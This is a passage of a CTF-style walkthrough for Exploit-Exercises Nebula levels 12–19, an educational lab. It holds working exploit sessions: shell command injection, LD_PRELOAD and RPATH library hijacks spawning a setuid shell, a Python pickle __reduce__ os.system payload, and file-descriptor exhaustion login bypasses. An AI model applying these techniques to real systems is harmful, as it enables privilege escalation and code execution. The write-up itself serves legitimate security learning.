  <span class="n">key</span> <span class="o">-=</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
<div class="section" id="id34">
<h2>3.28.13. <a class="reference external" href="http://exploit-exercises.com/nebula/level12">Nebula Level 12</a><a class="headerlink" href="#id34" title="Permalink to this headline">¶</a></h2>
<p>Run the nebula vm, logging in with level12/level12.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level12@nebula:~$</span> nc <span class="m">127</span>.0.0.1 <span class="m">50001</span>
<span class="go">Password: `getflag` &gt; /tmp/getflag</span>
<span class="go">Better luck next time</span>
<span class="gp">level12@nebula:~$</span> cat /tmp/getflag
<span class="go">You have successfully executed getflag on a target account</span>
</pre></div>
</div>
</div>
<div class="section" id="id35">
<h2>3.28.14. <a class="reference external" href="http://exploit-exercises.com/nebula/level13">Nebula Level 13</a><a class="headerlink" href="#id35" title="Permalink to this headline">¶</a></h2>
<p>Run the nebula vm, logging in with level13/level13. The easy way is to run the program via <code class="docutils literal notranslate"><span class="pre">gdb</span></code>, setting a breakpoint where the uid check is made so you can force it to the desired 1000, thus getting the output token.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level13@nebula:~$</span> objdump -M intel -S ~flag13/flag13 &gt; code.txt
<span class="gp">level13@nebula:~$ #</span> Read code.txt, see 0x80484f4 checks <span class="nv">uid</span> <span class="o">=</span> <span class="nv">1000</span> <span class="o">=</span> 0x3e8
<span class="gp">level13@nebula:~$</span> gdb ~flag13/flag13
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">(gdb) b *0x80484f4</span>
<span class="go">Breakpoint 1 at 0x80484f4</span>
<span class="go">(gdb) run</span>
<span class="go">Starting program: /home/flag13/flag13</span>

<span class="go">Breakpoint 1, 0x080484f4 in main ()</span>
<span class="go">(gdb) set $eax=0x3e8</span>
<span class="go">(gdb) c</span>
<span class="go">Continuing.</span>
<span class="go">your token is b705702b-76a8-42b0-8844-3adabbe5ac58</span>
<span class="go">[Inferior 1 (process 4167) exited with code 063]</span>
<span class="go">(gdb) quit</span>
<span class="gp">level13@nebula:~$</span> su - flag13 -c getflag
<span class="go">Password: b705702b-76a8-42b0-8844-3adabbe5ac58</span>
<span class="go">You have successfully executed getflag on a target account</span>
<span class="gp">level13@nebula:~$</span>
</pre></div>
</div>
<p>Another interesting solution is from <a class="reference external" href="http://forelsec.blogspot.com/2013/03/nebula-solutions-all-levels.html">Level 13 in Nebula Solutions - All Levels</a>. Here, you replace the <code class="docutils literal notranslate"><span class="pre">getuid()</span></code> function by preloading a shared library whose <code class="docutils literal notranslate"><span class="pre">getuid()</span></code> always returns 1000. You have to remember that since ~flag13/flag13 is setuid you can’t just slip in another library, but must instead make a non-setuid copy. In the end, it’s even easier than using gdb above.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level13@nebula:~$ #</span> Get a non-setuid copy of ~flag13/flag13
<span class="gp">level13@nebula:~$</span> cp ~flag13/flag13 .
<span class="gp">level13@nebula:~$ #</span> Preload an altered getuid<span class="o">()</span>
<span class="gp">level13@nebula:~$</span> cat &gt; getuid.c &lt;&lt;EOF
<span class="gp">#</span>include &lt;unistd.h&gt;
<span class="go">uid_t getuid() { return 1000; }</span>
<span class="go">EOF</span>
<span class="gp">level13@nebula:~$</span> gcc -shared -o getuid.so getuid.c
<span class="gp">level13@nebula:~$</span> <span class="nv">LD_PRELOAD</span><span class="o">=</span>./getuid.so ./flag13
<span class="go">your token is b705702b-76a8-42b0-8844-3adabbe5ac58</span>
<span class="gp">level13@nebula:~$</span> su - flag13 -c getflag
<span class="go">Password: b705702b-76a8-42b0-8844-3adabbe5ac58</span>
<span class="go">You have successfully executed getflag on a target account</span>
<span class="gp">level13@nebula:~$</span>
</pre></div>
</div>
</div>
<div class="section" id="id36">
<h2>3.28.15. <a class="reference external" href="http://exploit-exercises.com/nebula/level14">Nebula Level 14</a><a class="headerlink" href="#id36" title="Permalink to this headline">¶</a></h2>
<p>Run the nebula vm, logging in with level14/level14.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>level14@nebula:~$ # See how many characters in token (= 37)
level14@nebula:~$ wc -c ~flag14/token
37 /home/flag14/token
level14@nebula:~$ # Lazy so try 37 A&#39;s to see how encryption works
level14@nebula:~$ python -c \
    &quot;import os; os.system(&#39;echo &#39; + 37*&#39;A&#39; + &#39; | ~flag14/flag14 -e&#39;)&quot;
ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcde/
level14@nebula:~$
level14@nebula:~$ # Looks like adds n to byte position n, n=0, ...
level14@nebula:~$ cat &gt; decrypt.py &lt;&lt;EOF
#!/usr/bin/env python
token = &#39;857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.&#39;
pw = &quot;&quot;
for i, c in enumerate(token):
    pw = pw + chr(ord(token[i]) - i)
print(pw)
EOF
level14@nebula:~$ python decrypt.py
8457c118-887c-4e40-a5a6-33a25353165
level14@nebula:~$ su - flag14 -c getflag
Password: 8457c118-887c-4e40-a5a6-33a25353165
You have successfully executed getflag on a target account
level14@nebula:~$
</pre></div>
</div>
</div>
<div class="section" id="id37">
<h2>3.28.16. <a class="reference external" href="http://exploit-exercises.com/nebula/level15">Nebula Level 15</a><a class="headerlink" href="#id37" title="Permalink to this headline">¶</a></h2>
<p>Run the nebula vm, logging in with level15/level15.</p>
<p>This is difficult as it requires knowledge about shared libraries that many security wanna-be’s don’t have (like me). But then again, the purpose of doing these challenges is to learn, and learn you will with this one. The following 2 solution efforts are well worth reading: <a class="reference external" href="http://v0ids3curity.blogspot.com/2012/10/exploit-exercise-rpath-vulnerability.html">v0id s3curity Exploit Exercise - RPATH Vulnerability</a> and <a class="reference external" href="http://louisrli.github.io/blog/2012/08/17/nebula2/">Louis Li Nebula Shell Exploits (Solutions 15-19)</a> (but stop reading after level15, otherwise you might ruin the learning experience with 16 - 19).</p>
<p>This one starts off with looking for “anything out of the ordinary”, which for someone not familiar with shared libraries could be just about anything in the output :) The majority of output is about “No such file” in <em>open(“/var/tmp/flag15/…”) = -1 …</em>. Looking at <code class="docutils literal notranslate"><span class="pre">ls</span> <span class="pre">-laR</span> <span class="pre">/var/tmp/level15</span></code> we see it’s empty and owned by level15 - prime for injecting code through a shared library. After many twists and turns followed by consulting the above links, here is a relatively short (not simple) solution. First look at the .dynsym section for libc routines to inject:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level15@nebula:~$</span> readelf --dyn-syms ~flag15/flag15

<span class="go">Symbol table &#39;.dynsym&#39; contains 5 entries:</span>
<span class="go">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span>
<span class="go">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span>
<span class="go">     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.0 (2)</span>
<span class="go">     2: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span>
<span class="go">     3: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)</span>
<span class="go">     4: 080484cc     4 OBJECT  GLOBAL DEFAULT   15 _IO_stdin_used</span>
</pre></div>
</div>
<p>After a personal false start of <code class="docutils literal notranslate"><span class="pre">puts()</span></code>, <code class="docutils literal notranslate"><span class="pre">__libc_start_main&#64;GLIBC_2.0</span></code> is the routine to inject: it’s called first and we can <code class="docutils literal notranslate"><span class="pre">execve()</span></code> to get a shell. There are 2 stumbling blocks:</p>
<blockquote>
<div><ol class="arabic">
<li><p class="first">Specifying the “GLIBC_2.0” part of <code class="docutils literal notranslate"><span class="pre">__libc_start_main&#64;GLIBC_2.0</span></code></p>
<p><code class="docutils literal notranslate"><span class="pre">gcc</span></code> has a <em>–version-script</em> option where you can specify “GLIBC_2.0”.</p>
</li>
<li><p class="first">Linking in the rest of libc (since you’re not replacing all of libc).</p>
<p>That was solved by two <code class="docutils literal notranslate"><span class="pre">gcc</span></code>/<code class="docutils literal notranslate"><span class="pre">ld</span></code> static linking options: first <em>-static-libgcc</em> which uses the static libgcc, then the linker option <em>-Bstatic</em> to avoid dynamically linking against shared libraries (remember we can’t dynamically use the real <code class="docutils literal notranslate"><span class="pre">libc</span></code>).</p>
</li>
</ol>
</div></blockquote>
<p>Here goes an amazingly short solution from the v0id and Louis Li links above:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level15@nebula:~$ #</span> GLIBC_2.0 part of __libc_start_main@GLIBC_2.0
<span class="gp">level15@nebula:~$</span> <span class="nb">echo</span> <span class="s1">&#39;GLIBC_2.0 { };&#39;</span> &gt; version
<span class="gp">level15@nebula:~$ #</span> libc.c <span class="nb">source</span> needs __libc_start_main routine
<span class="gp">level15@nebula:~$ #</span>   which will run a flag15 shell
<span class="gp">level15@nebula:~$</span> cat &gt; libc.c <span class="s">&lt;&lt;EOF</span>
<span class="gp">#</span><span class="s">include&lt;stdlib.h&gt;</span>
<span class="gp">#</span><span class="s">define SHE</span>LL <span class="s2">&quot;/bin/sh&quot;</span>

<span class="go">int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))</span>
<span class="go">{</span>
<span class="go">  char *file = SHELL;</span>
<span class="go">  char *argv[] = {SHELL,0};</span>
<span class="go">  setresuid(geteuid(),geteuid(), geteuid());</span>
<span class="go">  execve(file,argv,0);</span>
<span class="go">}</span>
<span class="go">EOF</span>
<span class="gp">level15@nebula:~$ #</span>  Create static shared library that uses static-libgcc
<span class="gp">level15@nebula:~$ #</span>    this is key to avoiding errors
<span class="gp">level15@nebula:~$</span> gcc -shared -static-libgcc <span class="se">\</span>
    -Wl,--version-script<span class="o">=</span>version,-Bstatic  libc.c -o libc.so.6
<span class="gp">level15@nebula:~$</span> mv libc.so.6 /var/tmp/flag15/
<span class="gp">level15@nebula:~$</span> ~flag15/flag15
<span class="gp">sh-4.2$</span> <span class="c1"># Show running as flag15 and getflag</span>
<span class="gp">sh-4.2$</span> id
<span class="go">uid=984(flag15) gid=1016(level15) groups=984(flag15),1016(level15)</span>
<span class="gp">sh-4.2$</span> getflag
<span class="go">You have successfully executed getflag on a target account</span>
<span class="gp">sh-4.2$</span> <span class="nb">exit</span>
<span class="go">exit</span>
<span class="gp">level15@nebula:~$</span>
</pre></div>
</div>
</div>
<div class="section" id="id38">
<h2>3.28.17. <a class="reference external" href="http://exploit-exercises.com/nebula/level16">Nebula Level 16</a><a class="headerlink" href="#id38" title="Permalink to this headline">¶</a></h2>
<p>Run the nebula vm, logging in with level16/level16.</p>
<p>I personally wasted a lot of time trying to use <a class="reference external" href="http://perldoc.perl.org/perlre.html#Extended-Patterns">Extended Patterns (?{…})</a>. The idea is that in the web code <code class="docutils literal notranslate"><span class="pre">$pw</span> <span class="pre">=~</span> <span class="pre">$password</span></code> you could execute some code by passing in <em>(?{system(“/bin/getflag &gt; /tmp/proof.txt”)})</em>. But by default this is not allowed and you have to have something like <code class="docutils literal notranslate"><span class="pre">use</span> <span class="pre">re</span> <span class="pre">'eval';</span></code> added to the source to allow this to happen. And I can’t do that.</p>
<p>It turns out the actual solution is much simpler and focuses on the source code <code class="docutils literal notranslate"><span class="pre">...</span> <span class="pre">`egrep</span> <span class="pre">&quot;^$username&quot;</span> <span class="pre">/home/flag16/userdb.txt</span> <span class="pre">2&gt;&amp;1`;</span></code>. There are 2 problems to solve. First everything is translated to upper case and text after blanks are stripped off. So the exploit will involve running /tmp/GETFLAG. But we have to work around the /tmp part by letting the shell figure it out: <code class="docutils literal notranslate"><span class="pre">ls</span> <span class="pre">/*/GETFLAG</span></code>. Here goes a solution:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level16@nebula:~$</span> <span class="nb">echo</span> <span class="s2">&quot;/bin/getflag &gt; /tmp/getflag.txt&quot;</span> &gt; /tmp/GETFLAG
<span class="gp">level16@nebula:~$</span> chmod +x /tmp/GETFLAG
<span class="gp">level16@nebula:~$</span> wget -O wget.txt <span class="se">\</span>
    http://127.0.0.1:1616/index.cgi?username<span class="o">=</span><span class="s1">&#39;`/*/GETFLAG`&#39;</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>

<span class="gp">level16@nebula:~$</span> cat /tmp/getflag.txt
<span class="go">You have successfully executed getflag on a target account</span>
<span class="gp">level16@nebula:~$</span>
</pre></div>
</div>
</div>
<div class="section" id="id39">
<h2>3.28.18. <a class="reference external" href="http://exploit-exercises.com/nebula/level17">Nebula Level 17</a><a class="headerlink" href="#id39" title="Permalink to this headline">¶</a></h2>
<p>Run the nebula vm, logging in with level17/level17.</p>
<p><a class="reference external" href="https://docs.python.org/2/library/pickle.html#">pickle()</a> allows arbitrary code injection. After you are done with the relatively simple exploit below, you may wish to go back and read some of these: <a class="reference external" href="https://blog.nelhage.com/2011/03/exploiting-pickle/">Exploiting Misuse of Python’s “Pickle”</a>, <a class="reference external" href="http://cs.jhu.edu/~s/musings/pickle.html">Arbitrary code execution with Python pickles</a>, and <a class="reference external" href="http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf">Sour Pickles whitepaper</a> with <a class="reference external" href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">Sour Pickles slides</a>.</p>
<p>To get the pickle input text for an exploit by hand takes some effort, but the <a class="reference external" href="https://docs.python.org/2/library/pickle.html#pickling-and-unpickling-extension-types">__reduce__()</a> method does the heavy lifting for us. Basically, you can create an exploit class with only the <code class="docutils literal notranslate"><span class="pre">__reduce__()</span></code> method returning a tuple with between 2 and 5 elements (but we only use 2 here). The first element is a callable object which is our exploit (like <code class="docutils literal notranslate"><span class="pre">os.system()</span></code> to run a shell command). The second element is another tuple of the arguments for the first object (like <code class="docutils literal notranslate"><span class="pre">/bin/getflag</span> <span class="pre">&gt;</span> <span class="pre">/tmp/getflag.txt</span></code>). So when the target unpickles the exploit, the first element is executed using the second element, giving us <code class="docutils literal notranslate"><span class="pre">os.system('/bin/getflag</span> <span class="pre">&gt;</span> <span class="pre">/tmp/getflag.txt')</span></code> and we have our exploit.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level17@nebula:~$ #</span> Code to pickle a call to /bin/getflag via __reduce__ method
<span class="gp">level17@nebula:~$</span> cat &gt;getflag.py &lt;&lt;EOF
<span class="go">import pickle</span>
<span class="go">import os</span>
<span class="go">class Getflag(object):</span>
<span class="go">    def __reduce__(self):</span>
<span class="go">        return (os.system, (&#39;/bin/getflag &gt; /tmp/getflag.txt&#39;,))</span>
<span class="go">print(pickle.dumps(Getflag()))</span>
<span class="go">EOF</span>
<span class="gp">level17@nebula:~$ #</span> See what the pickle text looks like
<span class="gp">level17@nebula:~$</span> python getflag.py
<span class="go">cposix</span>
<span class="go">system</span>
<span class="go">p0</span>
<span class="go">(S&#39;/bin/getflag &gt; /tmp/getflag.txt&#39;</span>
<span class="go">p1</span>
<span class="go">tp2</span>
<span class="go">Rp3</span>
<span class="go">.</span>
<span class="gp">level17@nebula:~$ #</span> Run it and verify execution
<span class="gp">level17@nebula:~$</span> python getflag.py <span class="p">|</span> socat - tcp:127.0.0.1:10007
<span class="go">Accepted connection from 127.0.0.1:45989level17@nebula:~$ cat /tmp/getflag.txt</span>
<span class="go">You have successfully executed getflag on a target account</span>
<span class="gp">level17@nebula:~$</span>
</pre></div>
</div>
</div>
<div class="section" id="id40">
<h2>3.28.19. <a class="reference external" href="http://exploit-exercises.com/nebula/level18">Nebula Level 18</a><a class="headerlink" href="#id40" title="Permalink to this headline">¶</a></h2>
<p>Run the nebula vm, logging in with level18/level18.</p>
<p>There are at least 3 workable exploits with this level’s program:</p>
<blockquote>
<div><ol class="arabic simple">
<li>You can choose the log file to be the password file, thus setting it to a known value which you can use to login. We show that solution here.</li>
<li>The <code class="docutils literal notranslate"><span class="pre">login()</span></code> function still sets the user as logged in when <code class="docutils literal notranslate"><span class="pre">fp</span> <span class="pre">=</span> <span class="pre">fopen(PWFILE,</span> <span class="pre">&quot;r&quot;);</span></code> return fails - so use up all available file pointers to force a login without a password. We show <a class="reference external" href="http://pastebin.com/u/3nvisi0n">3nvisi0n</a>’s solution below.</li>
<li>There is a format string vulnerability when the <em>site exec</em> command calls the <code class="docutils literal notranslate"><span class="pre">notsupported()</span></code> function. See <a class="reference external" href="http://v0ids3curity.blogspot.com/2012/09/exploit-exercise-format-string.html">Exploit Exercise - Format String FORTIFY_SOURCE Bypass</a> for the complex, instructional solution. Alternatively, look at <a class="reference external" href="http://forelsec.blogspot.com/2013/03/nebula-solutions-all-levels.html">Level 18 in Nebula Solutions - All Levels</a> for another approach.</li>
<li>The <em>setuser</em> command calls <code class="docutils literal notranslate"><span class="pre">setuser()</span></code> which uses <code class="docutils literal notranslate"><span class="pre">sprintf()</span></code> which can buffer overflow <em>char msg[128];</em>. But <a class="reference external" href="https://github.com/slimm609/checksec.sh">checksec.sh</a> shows the program has NX enabled and a stack canary, making that probably a dead end.</li>
</ol>
</div></blockquote>
<p>Here we exploit problem (1). Setting the log file option to be the password file via <code class="docutils literal notranslate"><span class="pre">~flag18/flag18</span> <span class="pre">-d</span> <span class="pre">~flag18/password</span></code> sets the password to the log message “Starting up. Verbose level = 0\n” (note the trailing “\n”). So we know the password. But when entering the password via the command “login …”, the trailing “\n” is stripped causing the password check to fail. To work around this set the byte immediately after “login” to “\0” and the trailing “\n” will be preserved.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level18@nebula:~$ #</span> Set password to <span class="s2">&quot;Starting up. Verbose level = 0\n&quot;</span>
<span class="gp">level18@nebula:~$</span> cat /dev/null <span class="p">|</span> ~flag18/flag18 -d /home/flag18/password
<span class="gp">level18@nebula:~$ #</span> Put NULL after <span class="s2">&quot;login&quot;</span> so password has trailing <span class="s2">&quot;\n&quot;</span>
<span class="gp">level18@nebula:~$</span> <span class="nb">echo</span> -ne <span class="se">\</span>
    <span class="s2">&quot;login\0Starting up. Verbose level = 0\nshell\n&quot;</span> <span class="se">\</span>
    &gt; exploit.txt
<span class="gp">level18@nebula:~$</span> cat exploit.txt - <span class="p">|</span> ~flag18/flag18
<span class="go">getflag</span>
<span class="go">You have successfully executed getflag on a target account</span>
<span class="go">exit</span>

<span class="gp">level18@nebula:~$</span>
</pre></div>
</div>
<p>For the curious, we reproduce <a class="reference external" href="http://pastebin.com/WjJTmQxH">3nvisi0n’s Exploit-Exercises Nebula Solutions</a> attack against problem (2) above (using python). If 1025 logins doesn’t do the trick for you, bump up 1025 until it does.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level18@nebula:~$</span> python -c <span class="s1">&#39;print &quot;login AAAAAAA\n&quot;*1025&#39;</span> &gt; /home/level18/pl
<span class="gp">level18@nebula:~$</span> <span class="nb">printf</span> <span class="s2">&quot;closelog\nshell\n&quot;</span> &gt;&gt; /home/level18/pl
<span class="gp">level18@nebula:~$</span> cat ~/pl <span class="p">|</span> ~flag18/flag18 --init-file -d /dev/tty
<span class="go">/home/flag18/flag18: invalid option -- &#39;-&#39;</span>
<span class="go">/home/flag18/flag18: invalid option -- &#39;i&#39;</span>
<span class="go">/home/flag18/flag18: invalid option -- &#39;n&#39;</span>
<span class="go">/home/flag18/flag18: invalid option -- &#39;i&#39;</span>
<span class="go">/home/flag18/flag18: invalid option -- &#39;t&#39;</span>
<span class="go">/home/flag18/flag18: invalid option -- &#39;-&#39;</span>
<span class="go">/home/flag18/flag18: invalid option -- &#39;f&#39;</span>
<span class="go">/home/flag18/flag18: invalid option -- &#39;i&#39;</span>
<span class="go">/home/flag18/flag18: invalid option -- &#39;l&#39;</span>
<span class="go">/home/flag18/flag18: invalid option -- &#39;e&#39;</span>
<span class="go">Starting up. Verbose level = 0</span>
<span class="go">logged in successfully (without password file)</span>
<span class="go">logged in successfully (without password file)</span>
<span class="go">logged in successfully (without password file)</span>
<span class="go">logged in successfully (without password file)</span>
<span class="go">logged in successfully (without password file)</span>
<span class="go">getflag</span>
<span class="go">You have successfully executed getflag on a target account</span>
<span class="go">exit</span>
<span class="gp">level18@nebula:~$</span>
</pre></div>
</div>
</div>
<div class="section" id="id41">
<h2>3.28.20. <a class="reference external" href="http://exploit-exercises.com/nebula/level19">Nebula Level 19</a><a class="headerlink" href="#id41" title="Permalink to this headline">¶</a></h2>
<p>Run the nebula vm, logging in with level19/level19.</p>
<p>This one requires knowing how to get a process with a root parent process: fork a process, make the child an orphan by having the parent terminate immediately, child delays a bit giving the init process time to become the new parent. Then running ~flag19/flag19 in the child gets a root shell.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">level19@nebula:~$</span> cat &gt; orphan.c &lt;&lt;EOF
<span class="gp">#</span>include &lt;unistd.h&gt;
<span class="go">int main() {</span>
<span class="go">  int pid = fork();</span>
<span class="go">  if (pid == 0) { // the child</span>
<span class="go">    sleep(5);</span>
<span class="go">    execl(&quot;/home/flag19/flag19&quot;, &quot;/bin/sh&quot;, &quot;-c&quot;, \</span>
<span class="go">          &quot;/bin/getflag &gt; /tmp/getflag.txt&quot;, NULL);</span>
<span class="go">  }</span>
<span class="go">}</span>
<span class="go">EOF</span>
<span class="gp">level19@nebula:~$</span> gcc -o orphan orphan.c
<span class="gp">level19@nebula:~$</span> ./orphan
<span class="gp">level19@nebula:~$</span> cat /tmp/getflag.txt
<span class="go">You have successfully executed getflag on a target account</span>
<span class="gp">level19@nebula:~$</span>
</pre></div>
</div>
</div>
</div>


           </div>
           
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="natas.html" class="btn btn-neutral float-right" title="3.29. Natas" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="skytower1.html" class="btn btn-neutral" title="3.27. SkyTower1" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.3',
            LANGUAGE:'None',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  <script type="text/javascript" src="../_static/js/theme.js"></script>

  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>